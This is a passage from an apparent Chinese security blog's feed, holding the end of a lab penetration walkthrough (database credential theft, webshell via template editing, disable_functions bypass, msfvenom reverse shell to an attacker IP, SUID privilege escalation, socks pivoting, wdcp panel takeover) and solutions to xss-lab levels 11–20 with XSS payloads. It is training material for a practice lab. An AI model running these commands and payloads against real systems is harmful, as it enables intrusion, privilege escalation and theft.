alt="Untitled"></p><p>再根据暴露出来的根目录修改脚本，读取doc-config-cn.php文件内容</p><p><img src="https://i.loli.net/2021/10/03/sDlRuv6N859MYqx.png" alt="Untitled"></p><p>可以看到DB_DBNAME、DB_USER、DB_PASSWORD几个字段，有了这些字段就可以连接到目标数据库了</p><p><img src="https://i.loli.net/2021/10/03/4XRGzOEd89KcBNm.png" alt="Untitled"></p><p>连接目标数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192<span class="number">.168</span><span class="number">.0</span><span class="number">.122</span> -uwww_ddd4_com -px4ix6ZrM7b8nFYHn</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/ed45rguZpG2SxDs.png" alt="Untitled"></p><h2 id="代码审计-破解算法登陆后台"><a href="#代码审计-破解算法登陆后台" class="headerlink" title="代码审计-破解算法登陆后台"></a>代码审计-破解算法登陆后台</h2><p>这里是后台地址</p><p><img src="https://i.loli.net/2021/10/03/LRsYXUEdKgWr82N.png" alt="Untitled"></p><p>找到源码加密算法</p><p><img src="https://i.loli.net/2021/10/03/qpP34yDzgXLcu79.png" alt="Untitled"></p><p>这里可以在根目录创建一个test.php，然后调用这个算法</p><p><img src="https://i.loli.net/2021/10/03/ncdLmiJRDAjEGaF.png" alt="Untitled"></p><p>admin加密后是33e2…</p><p><img src="https://i.loli.net/2021/10/03/BjkXYWa9uclb2PG.png" alt="Untitled"></p><p>前面已经拿到数据库权限，因此可以修改admin用户名的密码为33e2….，然后就可以通过admin/admin登陆后台了</p><p><img src="https://i.loli.net/2021/10/03/27R3NqxLhugoGIO.png" alt="Untitled"></p><h2 id="代码审计-后台任意文件上传漏洞"><a href="#代码审计-后台任意文件上传漏洞" class="headerlink" title="代码审计-后台任意文件上传漏洞"></a>代码审计-后台任意文件上传漏洞</h2><p>admini\controllers\system\bakup.php</p><p><img src="https://i.loli.net/2021/10/03/fwS2Kti7UgOmpEB.png" alt="Untitled"></p><p>这里过滤了后缀名，不过即使后缀名检测不通过，没有退出机制，文件依然会被上传 </p><p>随便找个上传点测一下参数m表示控制器名称，参数s表示文件名，参数a表示方法名</p><p><img src="https://i.loli.net/2021/10/03/gxub7UceLFZCGMv.png" alt="Untitled"></p><p>把路径修改为uploadsql的路径进行上传，虽然返回错误提示不过在后台可以看到文件已经上传了</p><p><img src="https://i.loli.net/2021/10/03/S8tEyX69GDdlF45.png" alt="Untitled"></p><p><img src="https://i.loli.net/2021/10/03/9h4d2YVrQnZDuKl.png" alt="Untitled"></p><p>不过.htaccess文件禁止了temp目录的访问，因此无法getshell</p><p><img src="https://i.loli.net/2021/10/03/oHQjl7rBXNqdnbt.png" alt="Untitled"></p><h2 id="后台模板编辑getshell"><a href="#后台模板编辑getshell" class="headerlink" title="后台模板编辑getshell"></a>后台模板编辑getshell</h2><p>在后台模板中编辑，插入一句话，重新应用一下模板</p><p><img src="https://i.loli.net/2021/10/03/qwykj7QGzSAVmDN.png" alt="Untitled"></p><p>一句话是插入到首页上面的，所以菜刀连接首页</p><p><img src="https://i.loli.net/2021/10/03/XvtEsCB3FMeAg5m.png" alt="Untitled"></p><p>直接getshell </p><p><img src="https://i.loli.net/2021/10/03/fs3hLtg2bjRkFE4.png" alt="Untitled"></p><h2 id="宝塔命令执行提权"><a href="#宝塔命令执行提权" class="headerlink" title="宝塔命令执行提权"></a>宝塔命令执行提权</h2><p>上面通过模板编辑拿到的shell不能执行命令</p><p><img src="https://i.loli.net/2021/10/03/WZo93aLSxbQNzdl.png" alt="Untitled"></p><p>上传bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so到根目录，然后通过下面的payload执行ifconfig命令，这样可以绕过宝塔对命令执行的限制 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.ddd4.com/bypass_disablefunc.php?cmd=ifconfig&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/EcpxSRqBidZJ6te.png" alt="Untitled"></p><h2 id="msf可交互shell"><a href="#msf可交互shell" class="headerlink" title="msf可交互shell"></a>msf可交互shell</h2><p>既然已经getshell也可以执行命令了，就可以尝试上传个反向shell，创建一个可交互式的shell</p><p>首先生成反向shell程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.0</span><span class="number">.128</span> LPORT=<span class="number">13777</span> -f elf &gt; ddd4</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/O3KofIvtJ74h6DS.png" alt="Untitled"></p><p>先通过菜刀把反向shell程序上传到根目录，然后对反向shell程序进行提权，默认没有执行权限，这里提权就用上了刚才用的宝塔命令执行绕过脚本</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/bypass_disablefunc.php?cmd=chmod%20777%20ddd4&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p>现在有了执行权限</p><p><img src="https://i.loli.net/2021/10/03/azTAhC4MFrd6Z7c.png" alt="Untitled"></p><p>msf进行监听</p><p><img src="https://i.loli.net/2021/10/03/3tY2mhHoJCjafPW.png" alt="Untitled"></p><p>执行ddd4</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ddd4.com/bypass_disablefunc.php?cmd=./ddd4&amp;outpath=/tmp/xx&amp;sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p>msf反弹shell成功 </p><p><img src="https://i.loli.net/2021/10/03/XCRA3N7ajg4ukmr.png" alt="Untitled"></p><p>为了更方便的操作，在msf里面可以切换shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/03/DWrCstMVaZ2fwH6.png" alt="Untitled"></p><h2 id="通过宝塔计划任务反弹shell"><a href="#通过宝塔计划任务反弹shell" class="headerlink" title="通过宝塔计划任务反弹shell"></a>通过宝塔计划任务反弹shell</h2><p>桌面存在文件bt.txt，里面有宝塔后台的ip和用户名密码</p><p>ip：<a href="http://192.168.0.122:8888/944906b5/">http://192.168.0.122:8888/944906b5/</a></p><p>用户名：gpeqnjf4</p><p>密码：d12924fa</p><p><img src="https://i.loli.net/2021/10/03/cBwQEVvfTtk6iXF.png" alt="Untitled"></p><p>找到创建计划任务的地方创建一个计划任务</p><p><img src="https://i.loli.net/2021/10/03/xPenoishYSwfT8A.png" alt="Untitled"></p><p>本机监听，准备反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp <span class="number">9001</span></span><br></pre></td></tr></table></figure><p>手动执行任务，反弹shell成功</p><p><img src="https://i.loli.net/2021/10/03/cAM7jDVfHdv1bEo.png" alt="Untitled"></p><p>权限是root</p><p><img src="https://i.loli.net/2021/10/03/te9VSM1lchWYwXr.png" alt="Untitled"></p><p>上一个部分，我们上传了一个反向shell程序ddd4到内网1号机，但是它的权限不够，可以利用这里的root权限对刚才的反向shell程序进行提权</p><p>这里getshell连接上之后进入根目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /</span><br></pre></td></tr></table></figure><p>然后再cd到www\wwwroot\<a href="http://www.ddd4.com目录,执行ddd4执行,此时ddd4是root权限/">www.ddd4.com目录，执行ddd4执行，此时ddd4是root权限</a></p><p>本地msf开启监听，反弹shell之后权限是root</p><p><img src="https://i.loli.net/2021/10/03/ltNcA3B45QLyqHf.png" alt="Untitled"></p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>执行下面命令搜索到有guid权限的程序  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -perm -u=s <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p>利用find程序进行提权</p><h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>sudo提权需要知道密码，可以通过一些linux信息收集工具收集到历史记录文件等，也许可以找到密码</p><h2 id="Linux内网权限扫描脚本"><a href="#Linux内网权限扫描脚本" class="headerlink" title="Linux内网权限扫描脚本"></a>Linux内网权限扫描脚本</h2><h3 id="LinEnum使用"><a href="#LinEnum使用" class="headerlink" title="LinEnum使用"></a>LinEnum使用</h3><p>github下载后，直接运行LinEnum.sh程序就可以了，如果要在远程主机上使用可以先在本机创建一个http服务器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>http服务器是在哪个目录开启的，哪里就是根目录</p><p>在目标机中进行下载</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="number">192.168</span><span class="number">.0</span><span class="number">.128</span>/LinEnum.sh</span><br></pre></td></tr></table></figure><p>在目标机上执行发现权限不足，可以利用suid提权</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir testfind test -<span class="built_in">exec</span> chmod <span class="number">777</span> ./LinEnum.sh \;</span><br></pre></td></tr></table></figure><p>扫描结果 </p><p><img src="https://i.loli.net/2021/10/03/nYLZjkC3h2J1y9m.png" alt="Untitled"></p><h3 id="linux-exploit-suggester的使用"><a href="#linux-exploit-suggester的使用" class="headerlink" title="linux-exploit-suggester的使用"></a>linux-exploit-suggester的使用</h3><p>这个用来检测是否存在提权 cve 漏洞</p><p><img src="https://i.loli.net/2021/10/03/3c2O1WhyP6lwx74.png" alt="Untitled"></p><h3 id="linuxprivchecker"><a href="#linuxprivchecker" class="headerlink" title="linuxprivchecker"></a>linuxprivchecker</h3><p>检测权限以及提权漏洞检测等</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2052.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2053.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2054.png" alt="Untitled"></p><h2 id="Linux-socks5内网穿透"><a href="#Linux-socks5内网穿透" class="headerlink" title="Linux socks5内网穿透"></a>Linux socks5内网穿透</h2><p>1、下载ssocks0.0.1并编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>2、进入ssocks\src目录，攻击机执行rcsocks</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2055.png" alt="Untitled"></p><p>3、进入内网1号机，执行rssocks程序</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2056.png" alt="Untitled"></p><p>4、攻击机设置proxychains代理</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2057.png" alt="Untitled"></p><p>使用proxychains代理扫描内网2号机开放的端口，此时应正常扫描，说明内网穿透成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 nmap -sT -Pn <span class="number">10.10</span><span class="number">.10</span><span class="number">.128</span></span><br></pre></td></tr></table></figure><p>在浏览器里直接设置socks代理就可以直接访问web网页</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2058.png" alt="Untitled"></p><p>ddd5.com是内网2号机上部署的网站，ip为10.10.10.128，攻击机可以直接访问，也可以说明内网穿越成功</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2059.png" alt="Untitled"></p><h2 id="模板上传getshell"><a href="#模板上传getshell" class="headerlink" title="模板上传getshell"></a>模板上传getshell</h2><p>查看内网1号机的hosts文件，绑定<a href="http://www.ddd5.com,进入发现是一个博客,采用emlog搭建/">www.ddd5.com，进入发现是一个博客，采用emlog搭建</a></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2060.png" alt="Untitled"></p><p>admin\123456进入后台可以直接上传模板，可以照着emlog模板复制一份，另外加上大马和一句话木马，压缩成zip后上传</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2061.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2062.png" alt="Untitled"></p><p>访问大马</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2063.png" alt="Untitled"></p><p>一句话木马执行命令</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2064.png" alt="Untitled"></p><h2 id="蚁剑穿透内网"><a href="#蚁剑穿透内网" class="headerlink" title="蚁剑穿透内网"></a>蚁剑穿透内网</h2><p>创建一个虚拟机windows7，确保可以跟内网1号机通信，因为1号机之前已经设置了代理，可以直接穿透内网</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2065.png" alt="Untitled"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2066.png" alt="Untitled"></p><p>下面设置代理，不过不设置也可以连通 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2067.png" alt="Untitled"></p><p>进入命令行，查看可以登陆的用户信息 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2068.png" alt="Untitled"></p><h2 id="wdcp系统提权"><a href="#wdcp系统提权" class="headerlink" title="wdcp系统提权"></a>wdcp系统提权</h2><p>访问内网2号机发现是wdlinux</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2069.png" alt="Untitled"></p><p>进入8080端口访问wdcp登陆面板</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2070.png" alt="Untitled"></p><p>登陆面板进不去，不过有个phpmyadmin面板可以进去，用root\wdlinux.cn登陆进去了 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2071.png" alt="Untitled"></p><p>找到登陆面板的用户名和密码，admin\moonsec123</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2072.png" alt="Untitled"></p><p>进来了 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2073.png" alt="Untitled"></p><p>有一个命令运行器，可以看到是root权限  </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2074.png" alt="Untitled"></p><p>尝试反弹shell，提示危险命令</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2075.png" alt="Untitled"></p><p>ssh管理，这里可以下载密钥，在下载之前需要先点击生成密钥</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2076.png" alt="Untitled"></p><p>通过内网穿透代理直接ssh登陆</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2077.png" alt="Untitled"></p><p>可以看到是root权限 </p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2078.png" alt="Untitled"></p><p>先玩到这里~谢谢观看</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;概况&quot;&gt;&lt;a href=&quot;#概况&quot; class=&quot;headerlink&quot; title=&quot;概况&quot;&gt;&lt;/a&gt;概况&lt;/h2&gt;&lt;h3 id=&quot;攻击主机&quot;&gt;&lt;a href=&quot;#攻击主机&quot; class=&quot;headerlink&quot; title=&quot;攻击主机&quot;&gt;&lt;/a&gt;攻击主机&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>xss-lab 11-20关</title>
    <link href="https://tutucoo.github.io/2021/04/19/xss-lab-11-20%E5%85%B3/"/>
    <id>https://tutucoo.github.io/2021/04/19/xss-lab-11-20%E5%85%B3/</id>
    <published>2021-04-19T02:05:55.000Z</published>
    <updated>2021-04-19T02:06:36.912Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-lab-11-20关"><a href="#xss-lab-11-20关" class="headerlink" title="xss-lab 11-20关"></a>xss-lab 11-20关</h1><h2 id="第十一关-Referer存在的xss"><a href="#第十一关-Referer存在的xss" class="headerlink" title="第十一关 Referer存在的xss"></a>第十一关 Referer存在的xss</h2><p>套路还是跟第十题类似，按钮被隐藏  输入exp进行测试 </p><p><img src="https://i.loli.net/2021/04/19/JDeZU7HwpnBFVWR.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled.png"></p><p>无论是单引号还是双引号都无法对其进行封闭，猜测引号被过滤了</p><p><img src="https://i.loli.net/2021/04/19/DrF9S1YyIGm7lQ4.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%201.png"></p><p>我们看下源码，到底进行了哪些防护</p><p>可以看到，不仅对t_sort的字符串进行了实体化操作，而且增加了对HTTP_REFERER的过滤，不允许字符串中包含大小括号</p><p><img src="https://i.loli.net/2021/04/19/5ZoxEs1yFjLmHzk.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%202.png"></p><p>这样一来，由于无法用单引或双引号进行闭合，就只能用大小括号进行闭合，现在连大小括号都过滤了，因此无法闭合。</p><p>山穷水覆疑无路，柳暗花明又一村，这里接收了HTTP_REFERER参数，我们就可以对这个参数进行输入</p><p>隐藏的输入框有个t_ref，通过源码比对也知道，它就是用来接收Referer的值的，但是这里直接对其进行请求是无法注入的，不过可以通过hackbar进行注入</p><p><img src="https://i.loli.net/2021/04/19/wGI7cZ8pbktgrhq.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%203.png"></p><p>最终exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert() type&#x3D;&quot;button&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/19/nSeVfwj48ogsMOu.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%204.png"></p><h2 id="第十二关-User-Agent存在的xss"><a href="#第十二关-User-Agent存在的xss" class="headerlink" title="第十二关 User-Agent存在的xss"></a>第十二关 User-Agent存在的xss</h2><p>看一下隐藏的元素，有个ua，这跟上一关应该类似，只不过这次是利用的User-Agent</p><p><img src="https://i.loli.net/2021/04/19/yPn3jLuleRoGIUW.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%205.png"></p><p>就不多说了，最终exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert() type&#x3D;&quot;button&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/19/b92h3QWoyuFR5ca.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%206.png"></p><h2 id="第十三关-Cookie存在的xss"><a href="#第十三关-Cookie存在的xss" class="headerlink" title="第十三关 Cookie存在的xss"></a>第十三关 Cookie存在的xss</h2><p>t_sort可注入，但是跟之前的一样，t_sort无法用引号闭合，而且过滤了括号，因为没法闭合，所以无法执行我们的代码，看到有个t_cook，就明白了，这是利用了cookie</p><p><img src="https://i.loli.net/2021/04/19/x1yQoTfUE5ZDqN9.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%207.png"></p><p>跟之前两关一样的操作，不过并没有xss</p><p><img src="https://i.loli.net/2021/04/19/HPiTjJQOM1R65Cv.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%208.png"></p><p>看了一下源码，确实是利用的cookie</p><p><img src="https://i.loli.net/2021/04/19/QmPyVUtW3FZhiMT.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%209.png"></p><p>不过这里需要添加user作为key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;&quot; onclick&#x3D;alert() type&#x3D;&quot;button&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/19/mnzp2BJiLedWlPE.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2010.png"></p><h2 id="第十四关-exif-xss"><a href="#第十四关-exif-xss" class="headerlink" title="第十四关 exif xss"></a>第十四关 exif xss</h2><p>这是一个罕见的exif xss，但是由于exifviewer好像不支持上传了，现在也已经无法复现了</p><h2 id="第十五关-angular-js-xss"><a href="#第十五关-angular-js-xss" class="headerlink" title="第十五关 angular js xss"></a>第十五关 angular js xss</h2><p>这一关通过第十四关跳转过来，有个src的参数</p><p><img src="https://i.loli.net/2021/04/19/AhvwzatqDFE64nB.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2011.png"></p><p>发现src的值会注入到这里，ngInclude是angular js独有的，相当于php的include函数 </p><p><img src="https://i.loli.net/2021/04/19/cz5pqknslPECwbo.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2012.png"></p><p>看下源码，是通过echo执行了这里的代码</p><p><img src="https://i.loli.net/2021/04/19/NAQEn4Ykwop8Pia.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2013.png"></p><p>我们包含一下level1进来，使用下面的exp，level1的xss就可以直接拿来用了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.21&#x2F;xss-lab&#x2F;level15.php?src&#x3D;&#39;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#39;</span><br></pre></td></tr></table></figure><p>执行没有效果，考虑是有过滤，看下源码，发现调用了htmlspecialchars函数，对括号、引号、&amp;号进行了过滤，但是这里奇怪的是，使用&lt;img又是可以的，htmlspecialchars函数是会过滤括号的，这里使用了括号怎么就可以了？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.21&#x2F;xss-lab&#x2F;level15.php?src&#x3D;&#39;level1.php?name&#x3D;&lt;img src&#x3D;1 onerror&#x3D;alert()&gt;&#39;</span><br></pre></td></tr></table></figure><h2 id="第十六关-空格过滤"><a href="#第十六关-空格过滤" class="headerlink" title="第十六关 空格过滤"></a>第十六关 空格过滤</h2><p>进来看来keyword参数，随便试一试</p><p><img src="https://i.loli.net/2021/04/19/AVTQzdoZvcHSRwP.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2014.png"></p><p>可以看到对一些字符进行了过滤，替换成了空格的html实体编码&amp;nbsp</p><p><img src="https://i.loli.net/2021/04/19/8X7MUOld4NvCi1k.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2015.png"></p><p>看下过滤的方式，可以看到对空格和/进行了过滤</p><p><img src="https://i.loli.net/2021/04/19/xjazDSlE6FmWrcT.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2016.png"></p><p>空格可以用%0D进行代替，%0D是URL编码表示归位</p><p>最终exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.21&#x2F;xss-lab&#x2F;level16.php?keyword&#x3D;%3Cimg%0Dsrc&#x3D;1%0Donerror&#x3D;alert()%3E</span><br></pre></td></tr></table></figure><h2 id="第十七关-flash控件xss"><a href="#第十七关-flash控件xss" class="headerlink" title="第十七关 flash控件xss"></a>第十七关 flash控件xss</h2><p>由于现在对flash不再支持，所以插件无法显示，但是不影响复现</p><p><img src="https://i.loli.net/2021/04/19/TApZnzVWtFGIb4h.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2017.png"></p><p>对两个参数进行操作，发现arg01作为变量，而arg02作为值，这样就可以用arg02测试xss了</p><p><img src="https://i.loli.net/2021/04/19/SHbVlQJAK3U1vth.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2018.png"></p><p>可以看到对两个参数都进行了引号、括号、&amp;号过滤</p><p><img src="https://i.loli.net/2021/04/19/6O9NsIvS3RcjloL.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2019.png"></p><p>经过测试，括号用``代替，绕过htmlspecialchars函数，因为是embed控件，查看它的属性，发现只有type没有用，但是这个属性并没有能够触发xss，查看它支持的事件，采用onmouseover事件进行测试(onmouseover前面必须有空格，属性之间必须有空格)，最终exp如下，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.21&#x2F;xss-lab&#x2F;level17.php?arg01&#x3D;dddd&amp;arg02&#x3D; onmouseover&#x3D;alert&#96;1&#96;</span><br></pre></td></tr></table></figure><h2 id="第十八关-flash控件xss"><a href="#第十八关-flash控件xss" class="headerlink" title="第十八关 flash控件xss"></a>第十八关 flash控件xss</h2><p>首页也是类似的</p><p><img src="https://i.loli.net/2021/04/19/yx3IUgwDMZfmPoF.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2020.png"></p><p>exp同第十七关完全一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.0.21&#x2F;xss-lab&#x2F;level17.php?arg01&#x3D;dddd&amp;arg02&#x3D; onmouseover&#x3D;alert&#96;1&#96;</span><br></pre></td></tr></table></figure><h2 id="第十九关-flash控件xss"><a href="#第十九关-flash控件xss" class="headerlink" title="第十九关 flash控件xss"></a>第十九关 flash控件xss</h2><p>本关进行之前需要了解flash xss:</p><p>Flash XSS攻击总结 杀死那个石家庄人/ 菲哥哥:<a href="https://www.secpulse.com/archives/44299.html">https://www.secpulse.com/archives/44299.html</a></p><p>这一类的xss比较少见，更多技术细节参见：</p><p>那些年我们一起学xss:<a href="https://wizardforcel.gitbooks.io/xss-naxienian/content/14.html">https://wizardforcel.gitbooks.io/xss-naxienian/content/14.html</a></p><p>payload flash xss</p><p><img src="https://i.loli.net/2021/04/19/4manwFxdISEet1M.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2021.png"></p><p><img src="https://i.loli.net/2021/04/19/VNjG5KPsmaHAyDc.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2022.png"></p><h2 id="第二十关-flash控件xss"><a href="#第二十关-flash控件xss" class="headerlink" title="第二十关 flash控件xss"></a>第二十关 flash控件xss</h2><p>这一题用到了zeroclipboard xss，具体可以参考这篇文章：</p><p><a href="https://www.freebuf.com/sectool/108568.html">https://www.freebuf.com/sectool/108568.html</a></p><p>国内广泛使用了zeroclipboard.swf，主要的功能是复制内容到剪切板，中间由flash进行中转保证兼容主流浏览器，具体做法就是使这个透明的flash漂浮在复制按钮之上</p><p>看一下源码：</p><p>使用jpexs反编译(swf反编译工具：<a href="https://github.com/jindrapetrik/jpexs-decompiler">https://github.com/jindrapetrik/jpexs-decompiler</a></p><p>)</p><p>原因显而易见，Externalinterface.call第二个参数传回来的id没有正确过滤导致xss</p><p><img src="https://i.loli.net/2021/04/19/uTsEYGUmQexPgXL.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2023.png"></p><p>payload</p><p><img src="https://i.loli.net/2021/04/19/GrR5nM8Jvp1zA4x.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2024.png"></p><p><img src="https://i.loli.net/2021/04/19/dkca5GHt8TpsRZf.png" alt="xss-lab%2011-20%E5%85%B3%200c31978e6d1a400cb1c8251f5fab4f1a/Untitled%2025.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss-lab-11-20关&quot;&gt;&lt;a href=&quot;#xss-lab-11-20关&quot; class=&quot;headerlink&quot; title=&quot;xss-lab 11-20关&quot;&gt;&lt;/a&gt;xss-lab 11-20关&lt;/h1&gt;&lt;h2 id=&quot;第十一关-Referer存在的xs</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>xss-lab 1-10关</title>
    <link href="https://tutucoo.github.io/2021/04/19/xss-lab-1-10%E5%85%B3/"/>
    <id>https://tutucoo.github.io/2021/04/19/xss-lab-1-10%E5%85%B3/</id>
